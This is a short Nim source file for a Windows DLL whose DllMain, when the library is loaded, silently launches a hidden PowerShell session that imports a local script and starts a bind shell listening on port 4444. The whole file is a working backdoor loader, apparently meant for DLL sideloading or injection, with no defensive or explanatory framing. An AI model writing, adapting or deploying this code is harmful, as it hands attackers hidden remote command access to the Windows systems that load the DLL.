import winim/lean
import osproc

proc NimMain() {.cdecl, importc.}

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  
  if fdwReason == DLL_PROCESS_ATTACH:
    let outp_shell = execCmd("powershell.exe -nop -w hidden -sta -C Import-Module C:\\temp\\shell.ps1;Invoke-PowerShellTcp -Bind -Port 4444")

  return true
